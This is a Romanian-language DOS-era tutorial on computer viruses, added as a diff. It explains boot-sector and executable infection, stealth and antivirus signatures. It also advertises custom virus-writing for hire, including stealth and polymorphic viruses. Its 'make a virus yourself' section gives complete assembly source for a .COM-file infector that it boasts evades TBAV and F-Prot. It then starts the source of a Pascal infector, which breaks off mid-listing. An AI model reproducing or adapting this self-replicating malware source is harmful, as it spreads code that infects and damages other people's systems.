@@ -1,0 +1,1008 @@
+.color 4
+.font 3 2
+   DESPRE CEEA CE SE CHEAMA "VIRUS"...
+.color 0
+.font 5 4
+
+        Inconjurati de{noteoln}
+.color 4
+ legende{noteoln}
+.color 0
+ si de mister , virusii par a fi un fel de
+O.Z.N.-uri ( à+á=ë ) ale calculatoristilor ; se vad dar nu se prea pot dovedi, se
+stiu face invizibili, se transforma in cele mai neasteptate moduri. Pot fi
+acuzati de cele mai nastrusnice lucruri si nu rareori sunt in stare de ele.
+
+        Ideeea de a juca feste colegilor este mai veche decit computerele,
+dar in domeniul informatic abia odata cu aparitia acestora s-a dezvoltat
+pe deplin.Prin anii 70' festele erau orientate pe mesaje pe ecran sau la
+imprimanta.Se studia mutra sefului in timp ce acesta citea la intrarea in
+sistem : "Avertisment : Un utilizator cu indicele de inteligenta sub 30
+a intrat in sistem".
+        Stramosii virusilor de computere si-au facut aparitia pe la inceputul
+anilor '80. Erau de fapt niste mici programe utile pentru "victima" dar
+care aveau in corpul lor si un modul periculos. Cu putin noroc victima se
+apuca sa povesteasca "ciudateniile" care i se intimplasera de la o vreme.
+Astfel gluma era completa. Asa au aparut primii "Cai Troieni" informatici !
+.image 3 476 40 \imagini\320x200\panter.gif
+
+.color 4
+.font 5 5
+  NOTA IMPORTANTA :{noteoln}
+.color 0
+.font 5 4
+ Informatia din acest fisier se adreseaza utilizatorilor cu nivel mic si mediu de cunostiinte in acest
+domeniu. Acest fisier este creat in special pentru a face o cercetare a fenomenului numit virus informatic si nu pentru a produce
+pagube pe calculatoare. Desigur informatia prezentata este suficienta pentru a produce virusi destul de periculosi, dar nu recomand
+asta,in fond nu rezolvi nimic creand virusi. La sfarsitul fisierului sunt date sursele complete a doi virusi perfect functionabili.
+
+
+
+                              PENTRU CONSULATII IN DOMENIUL "VIRUSOLOGIEI COMPUTERELOR" SAU
+                              PENTRU REALIZAREA DE VIRUSI PE COMANDA CAUTATIMA PERSONAL.
+                              GARANTEZ EXECUTAREA PE COMANDA A URMATOARELOR TIPURI DE VIRUSI:
+                                  -de tip fisier pt. .COM-uri si .EXE (rezident sau nerezident )
+                                  -de tip BOOT
+                              La cerearea clientului virusul va fi simplu,stealth,cu autocodare,
+                              de tip "mirror" sau virus polimorf.
+                              Asigur livrarea virusului in format text sursa .ASM
+
+.font 5 5
+.color 4
+                                        NU EZITATI !!!
+.font 5 4
+.color 0
+
+
+.eop
+
+               1.  Virusii - o posibila definitie ...
+
+
+        Un virus informatic este un program care poseda proprietatea de a
+introduce copii executabile ale lui insusi in alte programe sau in alte
+sectoare vulnerabile ale unui sistem de calcul, cu scopul de a altera,
+schimba sau sterge continutul altor programe sau date.
+
+        Un program este considerat ca fiind virus daca prezinta urmatoarele
+proprietati :
+
+        I.   1. - modifica programe de sistem sau utilizator prin includerea
+             propriilor sale structuri in acestea.
+
+        II. Ramificare in doua tipuri :
+          a. 2. - recunoaste ca un program este deja infectat.
+             3. - daca recunoaste un program deja infectat, el va interzice o
+             noua modificare.
+          b. 2. - recunoaste ca un program este deja infectat.
+             3. - desi recunoaste un program infectat, el permite o noua
+             modificare ducind pina la urma la gituirea sistemului.
+
+        III.4. - programul modificat prezinta de acum proprietatile 1 - 3.
+
+
+        Programele "atacatoare" ce nu poseda simultan aceste nu pot fi in-
+cadrate strict in categoria de virusi ci numai in alte subramuri ale acestei
+categorii ca : vierme, cal troian sau bomba logica.
+
+        VIERMELE este un program care, odata ajuns intr-o retea de calcula-
+toare, devine activ intr-o statie de lucru in care nu se ruleaza nici un pro-
+gram.
+        CALUL TROIAN este un program care aparent este folositor dar, intoc-
+mai ca stramosul sau, are scopul de a distruge cit mai mult.
+        BOMBA LOGICA este un cal troian cce ataca fisierele ; un astfel de
+program poate avea acces la diferite zone ale memoriei, la care utilizatorul
+nu are acces in mod normal ( tabela a vectorilor de intrerupere ). Spre deo-
+sebire de celelalte tipuri de soft agresor, bomba logica se caracterizeaza
+printr - un efect distructiv puternic si intotdeauna necontrolat.
+
+.eop
+
+               2. Tipuri de virusi
+
+
+        Referindu - ne numai la virusi, a caror definitie, cit de cit exacta
+se gaseste mai sus, acestia se impart in doua mari tipuri :
+
+         I. - Virusi care ataca sectorul de boot, si a caror activare se
+            face la incacrcarea sistemului de operare.
+         II.- Virusi care ataca fisierele, in special cele executabile, si
+            care sint lansati la executarea fisierelor infectate.
+
+        Dar si aceste mari categorii se impart in subcategorii in functie
+de modul de infectare si de tipul infectarii :
+
+         I. - Virusi ce se instaleaza numai in primul sector al sectorului
+            de boot.
+            - Virusi se instaleaza in doua parti : in primul sector "capul"
+            iar in alte sectoare "corpul".
+         II.- Virusi ce infecteaza fisiere .COM.
+            - Virusi ce infecteaza fisiere .EXE.
+
+.eop
+
+              2.1  VIRUSII DE BOOT
+
+
+         Pentru a intelege comportamentul virusilor care infecteaza sectorul
+de autoincarcare al discurilor-sistem prezentam acum citeva elemente referi-
+toare la incarcarea sistemului de operare Ms-Dos.Incarcarea sistemului de
+operare este adeseori un moment favorabil pentru patrunderea virusilor in
+sistem.
+
+         Lansarea sistemului incepe cu parcurgerea urmatoarelor secvente:
+         1. Este executat programul de autotestare - POST (Power-On Self Test)
+         2. Se face o anumita initializare a sistemului.
+         3. Se incearca citirea primului sector al discului sistem,
+
+         1. Programul POST disgnosticheaza echipamentele instalate ( se veri-
+fica memoria RAM, perifericele instalate, etc. )
+         2. In perioada de initializare se actualizeaza tabela vectorilor de
+intrerupere, se initializeaza unele elemente hard, se verifica existenta
+extensiei ROM-BIOS.Incarcatorul ROM-BIOS este un program scurt care incarca
+in memorie primul sector din discul sistem.
+         3. Primul sector din discul sistem contine un incarcator specific
+sistemului Ms-Dos si este numit sectorul de auto-incarcare. Daca discul este
+un disc sistem el va contine o copie completa a sitemului de operare. In acest
+caz in primul sector se gaseste un scurt program a carui sarcina este sa in-
+ceapa procesul de startare a sistemului Dos din disc, citind din disc in me-
+morie prima parte a programelor Dos. Primul sector contine se asemenea blocul
+parametrilor BIOS.
+
+.eop
+
+                    Structura primului sector este :
+
+
+.font 0 1
+  +----------+------------------------------------------+-----------------+
+  |  Adresa  |                Continut                  | Marime in bytes |
+  +----------+------------------------------------------+-----------------+
+  |   00h    |    Instructiune de salt la inceputul     |       3         |
+  |          |       programului de autoincarcare       |                 |
+  +----------+------------------------------------------+-----------------+
+  |   03h    |         Numele si versiunea S.O.         |       8         |
+  +----------+------------------------------------------+-----------------+
+  |   0bh    |     Dimensiunea sectorului in octeti     |       2         |
+  +----------+------------------------------------------+-----------------+
+  |   0dh    |   Dimensiunea unui cluster in sectoare   |       1         |
+  +----------+------------------------------------------+-----------------+
+  |   0eh    |   Numarul de sectoare ocupate pina la    |       2         |
+  |          |        prima copie a FAT - ului          |                 |
+  +----------+------------------------------------------+-----------------+
+  |   10h    |     Numarul de copii ale FAT - ului      |       1         |
+  +----------+------------------------------------------+-----------------+
+
+.eop
+
+
+  +----------+------------------------------------------+-----------------+
+  |   11h    |   Numarul maxim de intrari in radacina   |       2         |
+  +----------+------------------------------------------+-----------------+
+  |   13h    |  Numarul total de sectoare ale discului  |       2         |
+  +----------+------------------------------------------+-----------------+
+  |   15h    |  Tipul discului, identic cu primul octet |       1         |
+  |          |    din tabela de alocare a fisierelor    |                 |
+  +----------+------------------------------------------+-----------------+
+  |   16h    |      Numarul de sectoare pentru FAT      |       2         |
+  +----------+------------------------------------------+-----------------+
+  |   18h    |       Numarul de sectoare pe pista       |       2         |
+  +----------+------------------------------------------+-----------------+
+  |   1ah    |   Numarul de fete ( capete de citire )   |       2         |
+  +----------+------------------------------------------+-----------------+
+  |   1ch    |  Numarul sectoarelor din fata sectorului |       4         |
+  |          | de incarcare ( sectoare ascunse ). Egal  |                 |
+  |          | cu 0 pentru discheta, iar pentru HD con- |                 |
+  |          |     tine numarul sectoarelor din fata    |                 |
+  |          |              partitiei Dos.              |                 |
+  +----------+------------------------------------------+-----------------+
+
+.eop
+
+.font 5 4
+     Programul de autoincarcare este lansat de incaracatorul ROM-BIOS care
+nu are nici o informatie despre structura bloc - logica a discului. Prin ur-
+mare el ajunge la primul octet din disc si il executa ca pe o instructiune.
+Instructiunea de salt (primii 3 octeti) care permite programului sa sara peste
+Blocul de Parametrii Bios are una din urmatoarele formele :
+
+        a. salt absolut (e9h) cu 2 octeti de deplasare : E9 XX XX
+        b. salt relativ (ebh) cu un octet de deplasare si o instructiune
+           neoperativa (NOP - 90h)  : EB XX 90
+
+     Este interesant de stiut ca sectorul de autoincarcare exista si la discu-
+rile care nu sunt de tip discuri sistem. In acest caz, sarcina acestui sector
+este de a semnala eroare la incercarea de incarcare a sistemului de pe un disc
+fara sistem de operare.
+     Exista o clasa intreaga de virusi care infecteaza sectorul de autoincarcare
+cum ar fi Brain, Bouncing Ball (sau Ping - Pong), virusii Stone s.a.
+     Intrucit sectorul de autoincarcare ocupa numai 512 octeti, nu virus care
+infecteaza acest sector se va instala in intregime in sector numai daca are o
+lungime mica (de exemplu, virusii Stone). Altfel va trebui sa se imparta in doua
+parti : "capul" virusului se va instala in sectorul boot, iar "corpul" virusului
+in alte sectoare, de obicei mai putin folosite, pe care apoi le va declara ca
+sectoare defecte. Prin aceasta isi asigura o sedere netulburata in sistem.
+     Primul lucru pe care il va face virusul consta in a se copia pe el insusi
+in RAM, unde va ramine rezident. Un virus ajuns in RAM este activ el putind
+infecta orice disc ce va fi folosit.
+
+.eop
+
+.font 0 1
+     +-------------------------------------+
+     | ROM - BIOS                          |
+     +-------------------------------------+
+     | ROM sau RAM                         |
+     +-------------------------------------+
+     | COMMAND.COM (tranzient)             |
+     +-------------------------------------+     }
+     |                                     |     }    Virusul se copiaza
+     |   RAM liber                         |     }    in aceasta parte a
+     |                                     |     }    memoriei.
+     +-------------------------------------+     }
+     | COMMAND.COM                         |
+     +-------------------------------------+
+     | Drivere din Config.Sys              |
+     +-------------------------------------+
+     | Blocurile de Control Ale Fisierelor |
+     +-------------------------------------+
+     | Bufferele disc                      |
+     +-------------------------------------+
+     | Tabelele MS-DOS                     |
+     +-------------------------------------+
+     | MSDOS.SYS                           |
+     +-------------------------------------+
+     | IO.SYS                              |
+     +-------------------------------------+
+     | Tabelele ROM-BIOS                   |
+     +-------------------------------------+
+     | Tabela Vectorilor de Intrerupere    |
+     +-------------------------------------+
+.eop
+
+.font 5 4
+     Numai dupa ce s-a activat, virusul permita sistemului sa - si deruleze
+algoritmul de incarcare. Daca incarcarea sistemului solicita mai mult timp
+decit de obicei e un indiciu serios ca putem avea sistemul infectat.
+     Un utilizator atent poate sesiza cresterea timpului la autoincarcarea si,
+respectiv, in celelalte operatii cu discul.
+
+
+
+             2.2   VIRUSII DE FISIERE EXECUTABILE
+
+
+      Pentru a-si putea duce la indeplinire misiunea distructiva virusul
+trebuie sa beneficieze de lansarea in executie a altor programe si camuflat
+sa-si realizeze si obiectivele proprii. El va alege practic ca mediu de
+evolutie orice program susceptibil de a fi incarcat in memoria principala
+si executat. Acest lucru explica de ce sint afectate cu prioritate fisierele
+de tip EXE si COM.
+       Sarcina de a se atasa unui program executabil nu este deloc usoara,
+mai ales cind acest lucru se doreste a fi cit mai discret posibil si sa treaca
+neobservat o perioada de timp cit mai mare.
+        Asadar, sa privim in detaliu, cu multa atentie intregul mecanism
+fixare a virusului in fisierele care contin cod executabil.
+        Cel putin citeva aspecte sint fundamentale in indeplinirea acestei
+functii si se impun a fi studiate pe masura :
+
+        1. Cum sint alese fisierele ce vor fi infectate.
+        2. Cum se evita implantarea intr-un program deja infectat.
+        3. Cum se implanteaza practic in programul executabil.
+
+      1.Alegerea tipului fisierelor ce urmeaza a fi infectate se face simplu,
+dupa informatia de tip (EXE, COM) asociata fiecarui fisier in catalogul
+fisierelor(in intrarea in director).
+
+.eop
+
+
+      2.Implantarea virusului pe un program deja infectat nu s-ar justifica
+pentru ca, pe de o parte, ar mari excesiv dimensiunea fisierului, pe de alta
+parte, lansarea in executie a programului este valorificata o singura data
+de virus, lucru realizabil de secventa virala deja existenta.In aceste con-
+ditii modulul de proliferare trebuie sa aiba capacitatea de a discerne intre
+un program deja infectat si unul neinfectat.
+        In general un virus este capabil sa recunoasca infectarea programului
+gazda dupa semnatura sa proprie. Aceasta metoda poate fi aplicata cu succes
+cu pretul a citorva bytes continind aceasta componentasi plasati intr-un loc
+usor de gasit, la inceputul sau la sfirsitul secventei virale.
+        Alte mecanisme, cu nimic mai complexe decit acesta, se folosesc de
+faptul ca utilizatorul nu beneficiaza in mod curent din partea sistemului
+de toate informatiile, unele minore, existente despre fisiere. Astfel un virus
+poate insuma 100 ani, spre exemplu, la data ultimei actualizari. Intrucit
+sistemul nu ofera utilizatorului decit ultimele doua cifre ale anului ultimei
+modificari mecanismul este cu atit mai eficient si mai rapid, cu cit nu
+presupune in faza de proliferare a virusului decit consultarea cataloagelor
+de fisiere si nu deschiderea fisierelor propriu-zise, in situatia in care ele
+sint deja contaminate.
+
+.eop
+
+      3.Implementarea in fisierele executabile este cea mai importanta functie
+a virusilor. In functie de modul de implementare a acestei functii se deose-
+besc citeva tipuri de virusi informatici :
+        a. Virusi care suprascriu portiunea de la inceputul programului.
+        b. Virusi care nu suprascriu zone din programul purtator.
+
+      a. In cazul acestui tip de virus efectul distructiv se manifesta numai
+dupa proliferarea virusului in intregul sistem. Prin suprascrierea unei zone
+din program cresc sansele aparitiei unor anomalii in functionare, contribuind
+decisiv la desconspirarea virusului. De altfel acest tip de virus este foarte
+putin raspindit.
+
+     b. Acesti virusi de implanteaza intr-un fisier continind program execu-
+tabil, marind dimensiunea fisierului cu lungimea secventei perazite. In cazul
+virusilor care nu suprascriu programul purtator, sansa depistarii virusului,
+fara un program antivirus adecvat,  este mica deoarece comportamentul siste-
+mului este perfect normal, neinregistrindu-su decit mici intirzieri la incar-
+carea programelor in memorie.
+
+.eop
+
+        2.3 MODUL DE IMPLANTARE
+
+        2.3.1 Virusii de fisiere .EXE
+
+     Antetul unui fisier .EXE
+
+.font 0 1
+     +-----------+----+---------------+---------------------------------+
+     |Deplasament|Dim.| Nume          | Continut                        |
+     +-----------+----+---------------+---------------------------------+
+     |    0h     |  2 |    4Dh 5Ah    | Semnatura programelor EXE (MZ)  |
+     +-----------+----+---------------+---------------------------------+
+     |    2h     |  2 |    PARTPAG    | Lungimea paginii partiale la    |
+     |           |    |               |  sfirsitul programului          |
+     +-----------+----+---------------+---------------------------------+
+     |    4h     |  2 |    PAGECNT    | Lungimea in pagini de 512 bytes |
+     +-----------+----+---------------+---------------------------------+
+     |    6h     |  2 |    RELOCNT    | Numarul inregistrarilor din     |
+     |           |    |               |  tabela de relocare             |
+     +-----------+----+---------------+---------------------------------+
+     |    8h     |  2 |    HDRSIZE    | Dimensiunea antetului in        |
+     |           |    |               |  paragrafe de 16 bytes          |
+     +-----------+----+---------------+---------------------------------+
+
+.eop
+
+
+     +-----------+----+---------------+---------------------------------+
+     |   0Ah     |  2 |    MINMEM     | Minimul de memorie necesar dupa |
+     |           |    |               |  program                        |
+     +-----------+----+---------------+---------------------------------+
+     |   0Ch     |  2 |    MAXMEM     | Maximul de memorie necesar dupa |
+     |           |    |               |  program                        |
+     +-----------+----+---------------+---------------------------------+
+     |   0Eh     |  2 |    RELOSS     | Deplasamentul pentru segmentul  |
+     |           |    |               |  de stiva                       |
+     +-----------+----+---------------+---------------------------------+
+     |   10h     |  2 |    EXESP      | Valoarea pentru registrul SP    |
+     |           |    |               |  la lansare                     |
+     +-----------+----+---------------+---------------------------------+
+     |   12h     |  2 |    CHKSUM     | Suma de control a fisierului    |
+     |           |    |               |  (suma negativa a tuturor       |
+     |           |    |               |  cuvintelor fisierului)         |
+     +-----------+----+---------------+---------------------------------+
+     |   14h     |  2 |    EXEIP      | Valoarea registrului IP la      |
+     |           |    |               |   lansarea in executie          |
+     +-----------+----+---------------+---------------------------------+
+     |   16h     |  2 |    RELOCS     | Deplasamentul pentru segmentul  |
+     |           |    |               |  de cod                         |
+     +-----------+----+---------------+---------------------------------+
+     |   18h     |  2 |    TABLEOFF   | Deplasamentul primei inregis-   |
+     |           |    |               |  trari de relocare              |
+     +-----------+----+---------------+---------------------------------+
+     |   1Ah     |  2 |    OVERLAY    | Numarul de suprapuneri          |
+     +-----------+----+---------------+---------------------------------+
+     |   1Ch     |  4 |               | Dimensiunea zonei formatate a   |
+     |           |    |               |  antetului .EXE                 |
+     +-----------+----+---------------+---------------------------------+
+
+.eop
+
+.font 5 4
+        Modul de actiune al virusilor de fisiere .EXE consta in modificarea
+valorilor importante din antetul fisierelor .EXE. Astfel un virus va modifica
+intotdeauna valoarea registrului IP si a deplasamentului pentru segmentul de
+cod astfel incit sa pointeze pe prima intructiune a virusului. Acesta, dupa
+realizarea secventei sale de program reda controlul programului purtator
+printr-un salt la adresele originale continute in antet.
+        De aici rezulta ca virusul trebuie sa pastreze in corpul sau si infor-
+matii referitoare la saltul original la inceputul programului. De altfel pe
+aceste informatii din corpul virusului se bazeaza programele antivirus care
+cauta si scot virusii din fisierele infectate.
+        Alte informatii importante frecvent modificate de virus sint deplasa-
+mentul pentru segmentul de stiva si valoarea registrului SP la lansare. Ca
+si in cazul anterior, informatiile trebuiesc retinute in corpul virusului,
+aceasta ducind la cautarea respectivelor informatii in corpul programului
+infectant si inlocuirea valorilor originale in antetul fisierului.
+        Odata cu marirea dimensiunilor fisierului trebuiesc modificate si
+informatiile privitoare la lungimea paginii partiale de la sfirsitul progra-
+mului precum si dimensiunea in pagini de 512 bytes a programului.
+        Odata modificate aceste informatii nu mai sint retinute in cadrul pro-
+gramului agresor ci sint calculate dinamic. Un program antivirus nu cauta
+secventele in corpul virusului ci calculeaza aceste valori scazind din lungi-
+mea programului infectat lungimea virusului si modificind in cadrul antetului
+aceste valori.
+
+.eop
+
+        2.3.2 Virusii de fisiere .COM
+
+        Antetul unui fisier .COM
+
+        De fapt fisierele .COM nu contin un asa numit antet ele fiind
+precedate numai de 3 bytes de salt la inceputul codului executabil al pro-
+gramului.
+        In cazul acestor fisiere infectarea este mult mai simpla virusul
+neumblind decit la aceste valori, rescriidu - le astfel incit sa pointeze
+pe secvente proprie de inceput predind controlul programului original dupa
+propria sa executare.
+
+.font 0 1
+        +-----+-------+----------------+
+        |  A  | Date  | Cod executabil |
+        +-----+-------+----------------+
+
+        +-----+-------+----------------+-----------+-----+
+        | A+B | Date  | Cod executabil | Cod Virus |  A  |
+        +-----+-------+----------------+-----------+-----+
+
+.font 5 4
+        A - salt original la inceputul codului executabil
+        B - lungime Cod executabil
+
+.eop
+
+
+        2.4 Modulul de camuflare
+
+
+     Daca in formele primitive virusii isi impuneau oarecum cu brutalitate me-
+sajul purtator de dezastre, in formele lor evoluate abilitatea de a se impune
+a crescut, facindu-i mai de temut ca oricind. O functiune noua se contura tot
+mai mult, aceea de camuflare a actiunii virusului, cel putin pentru o perioada
+de timp ; pina la instaurarea unei stari favorabile in sistem, pina la un mo-
+ment propice pentru deconspirare, cind procesul distructiv devenise ireversibil,
+totul trbuia sa para absolut normal. In foarte multe cazuri toata actiunea viru-
+lui se desfasoara cu discretie totala. Urmarirea unor obiective de genul procu-
+rarii de avantaje materiale pe seama patrunderii neautorizate intr-un sistem de
+gestiune impune acordarea unor valente cu totul deosebite tehnicilor de camuflaj
+facind uneori imposibila depistarea virusului.
+     Asigurarea perioadei de "incubatie" se face printr-o serie de actiuni orien-
+tate exclusiv spre ascunderea tuturor modificarilor intervenite in sistem dato-
+rita virusului. Intr-o prima etapa s-a crezut ca utilizatorul este singurul care
+putea sesiza astfel de modificari, iar din aceasta cauza virusul urmarea cu pre-
+cadere mascarea aparentelor exterioare. Un fisier afectat trebuie sa-si conserve
+data crearii si a actualizarii pentru a nu stirni suspiciuni. Daca implantarea
+virusului s-a facut cu modificarea dimensiunilor fisierului afectat, functia de
+camuflare trebuie sa asigure interceptarea comenzilor de afisare a rezumatului
+despre fisiere, precum si prezentarea lungimii initiale a fisierelor, nicidecum
+a celei reale. In momentul dezvoltarii unor programe specializate in depistarea
+virusilor si controlul utilizarii resurselor sistemului, virusii informatici
+s-au adaptat si acestor restrictii. Camuflarea si deghizarea lor se faceau nu
+numai prin prisma aspectelor exterioare, ci si a mecanismului intern de lucru.
+     Astfel interventiile virusului in scopul proliferarii sau manifestarii ac-
+tiunii distrugatoare erau intre cele mai scurte, pentru a nu putea fi intercep-
+tate de utilitare specializate in afisarea monitorizarii resurselor. Rezidenta
+in memorie era abil accunsa, nefiind de multe ori gestionata pe calea clasica,
+utilizata de celelalte programe.
+     Din punctul de vedere al modului de camuflare a prezentei o clasa aparte de
+de virusi informatici o reprezinta virusii evolutivi. Ei sunt dotati cu capaci-
+tatea de a-si modifica esential comportamentul pe parcursul existentei lor in
+calculator .
+
+.eop
+
+
+    3.1. Aplicatie practica. Studiul unor virusi foarte raspanditi
+
+    --- Virusul "STONE" ---
+
+    Unul dintre primii virusi pe care am avut ocazia sa-i capturez si apoi
+sa-i studiez a fost si virusul STONE. Acest virus mai este cunoscut si sub
+denumirile de STONED, HAMP, MARIJUANA, NEW-ZEA-LAND, HAWAII si SMITHSONIAN.
+Ca la majoritatea programeleor si acest virus are mai multe versiuni ,ca de
+exemplu STONED II, STONED III.
+    Este un virus de boot, care infecteaza sectoarele de boot ale dischetelor si
+tabelele de partitii ale hard-disk-urilor. Lungimea sa este de 512 bytes si
+ramane rezident in memorie.Deoarece patrunde in tabela de partitii acest
+virus NU este scos prin formatarea obisnuita a partitiei respective cu
+comanda "FORMAT".
+    Antivirusul Scan3.7v64. detine urmatoarele informatii pentru detectarea
+acestui virus:
+    Stoned-II Virus [S-2] -- Semnatura: 0x9c 0x2e 0xff 0x1e 0x09 0x00
+    Stoned Virus [Stoned] -- Semnatura: 0x00 0x53 0x51 0x52 0x06 0x56 0x57 0xbe
+Aceste informatii au fost obtinute decodificand fisierul in care antivirusul
+amintit pastreaza date referitoare la virusii cunoscuti.
+
+.eop
+
+    --- Virusul "PING-PONG" ---
+
+    Este un virus de boot care afecteaza dischetele si harddisk-urile.
+Lungimea sa este de 1024 de bytes si ramane rezident in memorie.
+"Semnatura" sa este 7D807426BEBE81B90400807C0401740C807C04047406. Mai este
+cunoscut si sub denumirile : ITALIAN, BOUNCING BALL si FOUNCINGDOT.
+O versiune a acestuia pentru AT-uri este cunoscuta sub denumirea de PING-PONG 286.
+Iata in continuare un fragment din prima parte a acestui virus:
+
+.font 0 1
+.color 1
+    ...
+    xor ax , ax
+    mov ss , ax
+    mov sp , 7c00h
+    mov ds , ax
+    mov ax , [413h]
+    sub ax , 2
+    mov [413h] , ax
+
+    mov cl , 6
+    shl ax , cl
+    sub ax , 07c0h
+
+    mov es , ax
+    mov si , 7c00h
+    mov di , si
+    mov cx , 100h
+    rep movsw
+
+    mov cs , ax
+    push cs
+    pop ds
+    ...
+.font 5 4
+.color 0
+.image 3 240 160 \imagini\320x200\papagal.gif
+.eop
+
+    Dupa cum se vede din acest fragment virusul se autocopiaza in ultimii 2K
+de memorie RAM raportata de BIOS ( adresa [0:413h] contine numarul de Kb ),
+dupa care scade din nr de Kb pe 2 si inscrie la aceiasi adresa noul numar.
+Practic virusul isi rezerva 2K de memorie in care sistemul de operare nu va
+mai avea acces.Deoarece este un virus de boot, el se afla initial la adresa
+0:7c00h, de unde se va copia in noua zona de memorie. Iata cum face virusul
+calculul adresei:
+    Sa presupunem ca un virus se afla initial la adresa seg1:ofs1 si trebuie
+copiat in ultimii n KB de memorie RAM. Noua adresa seg2:ofs1 se calculeaza
+din formula:
+    16*seg2+ofs1=(N-n)*1024 => seg2=(N-n)*64-trunc(ofs1/16) ,
+                   unde:
+                     N=nr de Kb memorie RAM raportati de BIOS
+                     n=ultimii KB de memorie RAM ce vor fi rezervati.
+    In cazul lui PING-PONG :
+    seg2=(N-2)*64-trunc(7c00h/16)=(N-2)*64-07C0h=(N-2)*2^6-07C0h
+
+.eop
+
+    3.2. Aplicatie practica. Realizati singur un ... virus !!!
+
+   Va voi prezenta in continuare doi virusi.
+   Primul este un virus de tip fisier ce infecteaza .COM-urile.Deoarece este
+un virus demonstrativ el nu are efect distructiv, singurul lucru care il face
+este sa afiseze un mesaj in fiecare luni.Codul sursa nu este optimizat, dar
+l-am creat asa pentru ca incepatorii sa inteleaga mai bine (cei cunoscatori
+sunt rugati sa sara la urmatorul punct).
+   Obs: - TBAV 6.35 si FProt x.xx nu detecteaza acest virus !!!
+        - Nici o versiune a lui TBScanX nu detecteaza acest virus !!!
+
+.eop
+
+
+-------------<taie de aici in jos>------------------------------------
+
+
+.font 0 1
+.color 1
+; **************************************************************
+; * Nume    : Virus VMA 2                                      *
+; * Autor   : Marian Veteanu                                   *
+; * Actiune : Infesteaza fisierele .COM                        *
+; * Efect   : Nu produce prea mari pagube !                    *
+; * Nota    : Acest virus l-am creat de pe vremea cand eram la *
+; *           liceu ( liceul Nicolae Balcescu din Pitesti )    *
+; **************************************************************
+
+lungime equ ((offset sfirsit)-(offset entry))
+.model tiny
+.code
+org 100h
+entry: call entr                                ; afla in BP adresa virusului
+entr   proc near
+       pop bp
+       sub bp,3
+       mov byte ptr [cale+2-entry+bp],'C'
+
+       mov cx,5                                 ; salveaza primii 5 bytes
+       mov si,offset header-entry               ; in memorie
+       add si,bp
+       mov di,offset horig-entry
+       add di,bp
+       rep movsb
+
+          mov ah,2ah
+          int 21h
+          cmp al,1                               ; afiseaza mesajul lunea
+          jnz urmat
+          mov ah,9
+          mov dx,offset mesaj-entry
+          add dx,bp
+          int 21h
+
+.eop
+
+urmat: mov ah,1ah                               ; seteaza DTA
+       mov dx,offset dta-entry
+       add dx,bp
+       int 21h
+
+       mov ah,4eh                               ; cauta primul fisier .COM
+       mov dx,offset cale-entry
+       add dx,bp
+       mov cx,2
+       int 21h
+       jc next
+
+open:  mov ax,4300h                             ; salveaza atributele fis gasit
+       mov dx,1eh+offset dta-entry
+       add dx,bp
+       int 21h
+       mov atrib,cx
+
+       mov ax,4301h                             ; sterge atributele fis gasit
+       xor cx,cx
+       mov dx,1eh+offset dta-entry
+       add dx,bp
+       int 21h
+
+       mov ax,3d02h                             ; deschide fis in mod R/W
+       mov dx,1eh+offset dta-entry
+       add dx,bp
+       int 21h
+next:  jc next2
+
+       mov bx,ax                                ; citeste primii 5 bytes
+       mov dx,offset header-entry               ; din fisierul gasit
+       add dx,bp
+       mov cx,5
+       mov ah,3fh
+       int 21h
+       jc close
+
+.eop
+
+       mov ax,0e2ffh                            ; verifica daca este deja virusat
+       cmp word ptr [header-entry+3+bp],ax
+       jz close
+
+       mov ax,4202h                             ; afla lungimea fisierului
+       xor cx,cx
+       xor dx,dx
+       int 21h
+       jc close
+       add ax,256
+       mov cs:(offset hnou+1-entry)[bp],ax
+
+       mov dx,bp                                ; scrie virusul la sfirsitul
+       mov cx,lungime                           ; fisierului
+       mov ah,40h
+       mov byte ptr [cale+2-entry+bp],'R'
+       int 21h
+       jc close
+
+       mov ax,4200h                             ; pozitioneaza pointerul
+       xor cx,cx                                ; la inceputul fisierului
+       xor dx,dx
+       int 21h
+       jc close
+
+       mov dx,offset hnou-entry                 ; scrie 'JMP' spre virus
+       add dx,bp
+       mov cx,5
+       mov ah,40h
+       int 21h
+
+close: mov ah,3eh                               ; inchide noul fisier virusat
+       int 21h
+
+       mov cx,atrib                             ; reface atributele fisierului
+       mov ax,4301h
+       mov dx,1eh+offset dta-entry
+       add dx,bp
+       int 21h
+.eop
+
+
+next2: jc retu
+
+       mov ah,4fh                               ; cauta urmatorul fisier .COM
+       int 21h
+       jc retu
+       jmp open
+
+
+retu:  mov cx,5                                 ; reface in memorie
+       mov si,offset horig-entry                ; primii 5 bytes
+       add si,bp
+       mov di,100h
+       rep movsb
+       mov dx,100h                              ; preda controlul prog. original
+       push dx
+       retn
+
+cale   db '*.ROM',0
+atrib  dw 0
+mesaj  db 13,10,'   Your computer has now VMA2 virus !!!',13,10,'$'
+header db 0C3h,0C3h,0C3h,0C3h,0C3h
+hnou   db 0BAh,0,0,0FFh,0E2h                    ; mov dx,?? jmp dx
+horig  db 5 dup (0)
+dta    db 43 dup (0)
+
+sfirsit:
+entr   endp
+end    entry
+
+.color 0
+.font 5 4
+-----------<taie de aici in sus>-----------------------------------
+
+.eop
+
+   Al doilea virus este un virus scris in Pascal. El este foarte rudimentar
+dar este totodata un exemplu despre cum se pot crea virusi si in alte
+limbaje de programare de nivel inalt, nu numai in asamblare.
+
+
+
+
+----------------<taie de aici in jos>-----------------------------------------
+
+.font 0 1
+.color 1
+{$i-}{$m 2048,0,24576}
+Program RNA;
+uses dos;
+
+const blksize=8192;                     { marimea buffer-ului                }
+      vsize=7200;                       { lungimea virusului                 }
+      wc='*.';
+      counter=blksize-1;
+      cb=':\';
+      maxinf:byte=4;                    { nr maxim de infectii               }
+      maxruns:byte=48;
+      drives:array[3..4] of char=('C','D'); { numele discurilor              }
+      imf:string[12]='ux142.rqz';       { numele fisierului temporar         }
+
+.eop
+
+type vtype=array[1..vsize] of byte;     { tipul buffer-ului pt memorarea vir }
+     buftype=array[1..blksize] of byte; { tipul buffer-ului pt operatii cu fis }
+
+var ps:string;                          { string-ul path                     }
+    s:pathstr;                          { programul curent ce ruleaza        }
+    ds:dirstr;                          { directorul curent                  }
+    ns:namestr;                         { fisierul programului curent        }
+    es:extstr;                          { extensia programului curent        }
+    v:^vtype;
+    buf:^buftype;
+    count,indx,inf:byte;
+    attr,nr,nw:word;
+    sr:searchrec;
+    f,f2:file;
+    t:longint;                          { pt memorarea datei si timpului fis }
+
+procedure copyf;                        { copiaza fisierul                   }
+begin
+ repeat
+  blockread(f,buf^,blksize,nr);
+  blockwrite(f2,buf^,nr,nw);
+ until (eof(f));
+ close(f);
+ setftime(f2,t);
